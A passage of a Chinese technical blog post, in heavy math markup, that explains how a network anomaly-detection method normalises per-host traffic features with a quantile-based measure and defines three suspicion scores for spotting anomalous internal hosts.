class="katex-mathml"><math><semantics><mrow><msub><mi>Q</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q_{k}(D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>表示数据集<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span></span></span></span>中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>分位点。该度量既考虑了中位数（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Q</mi><mn>50</mn></msub></mrow><annotation encoding="application/x-tex">Q_{50}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>），又考虑了由第一和第三四分位数表示的数据方差。这使得QWM具有鲁棒性，并独立于数据分布，同时也适用于归一化后的重尾分布。</p><p>对于 t 时刻主机 h 的特征向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，将其归一化之后用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi mathvariant="bold">x</mi><mo stretchy="true">‾</mo></mover><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\overline{\mathbf{x}}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7944400000000001em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6444400000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span></span></span><span style="top:-3.5644400000000003em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示。归一化操作为对其每个组成部分<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mo separator="true">,</mo><mspace width="1em"/><mi>i</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">x_{t}^{i}, \quad i \in\{1,2, \ldots, N\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071664em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">}</span></span></span></span>做如下操作：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><mi>t</mi><mi>i</mi></msubsup><mo>=</mo><mfrac><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mrow><mi>Q</mi><mi>W</mi><mi>M</mi><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="bold">x</mi><mi>t</mi><mi>i</mi></msubsup><mo fence="true">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">\bar{x}_{t}^{i}=\frac{x_{t}^{i}}{Q W M\left(\mathbf{x}_{t}^{i}\right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071664em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˉ</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.95166em;vertical-align:-0.81em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.14166em;"><span style="top:-2.4924999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">Q</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.07500000000000001em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathbf mtight">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8158857142857143em;"><span style="top:-2.209457142857143em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29054285714285716em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.07500000000000001em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9020857142857143em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.81em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>下图使用箱线图（boxplot）分别展示了QWM归一化前后的数据情况，其中numbytes的计量单位是MB，其余的都是纯数字：</p><p><img src="https://img-blog.csdnimg.cn/20200220181732529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200220181737938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /></p><h1 id="8-计算可疑分数s1-s2-s3"><a class="markdownIt-Anchor" href="#8-计算可疑分数s1-s2-s3"></a> 8 计算可疑分数（s1、s2、s3）</h1><p>每台内部主机 h 在时间 t 时刻的归一化特征向量为（ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>就可以表示在3D特征空间中的一个点）：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi>x</mi><mi>t</mi><mn>1</mn></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>t</mi><mn>2</mn></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>t</mi><mn>3</mn></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}=\left(x_{t}^{1}, x_{t}^{2}, x_{t}^{3}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>χ</mi><mi>t</mi><mi>i</mi></msubsup></mrow><annotation encoding="application/x-tex">\chi_{t}^{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071664em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">χ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>表示numbytes（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>χ</mi><mi>t</mi><mn>1</mn></msubsup></mrow><annotation encoding="application/x-tex">\chi_{t}^{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">χ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>），numdst（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>χ</mi><mi>t</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">\chi_{t}^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">χ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>），numflows（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>χ</mi><mi>t</mi><mn>3</mn></msubsup></mrow><annotation encoding="application/x-tex">\chi_{t}^{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">χ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>）。</p><p>在每个时刻 t 我们为每台主机计算下面的三个可疑分数：</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>1</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>：距特征空间质心的距离</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>：特征空间中的移动幅度</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>3</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>：特征空间中运动方向的可能性</li></ul><p>（注意三个特征向量和三个分数之间并不是一一对应）下面分别进行讨论。</p><h2 id="81-距特征空间质心的距离固定时刻t"><a class="markdownIt-Anchor" href="#81-距特征空间质心的距离固定时刻t"></a> 8.1 距特征空间质心的距离（固定时刻t）</h2><p>首先计算分数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>1</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>，通过该分数可以确定一台主机在时刻t，是否位于多位特征空间的异常区域内。</p><p>令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">{X}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>为时间 t 时，所有内部主机在特征空间中位置的集合（注意这里用大X表示）：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo>=</mo><mrow><mo fence="true">{</mo><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>:</mo><mi>h</mi><mo>∈</mo><msub><mi>H</mi><mi>I</mi></msub><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{X}_{t}=\left\{\mathbf{x}_{t}(h): h \in H_{I}\right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83611em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span></p><p>下面定义 t 时刻特征空间的质心<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="bold">c</mi><mrow><mo fence="true">(</mo><msub><mi 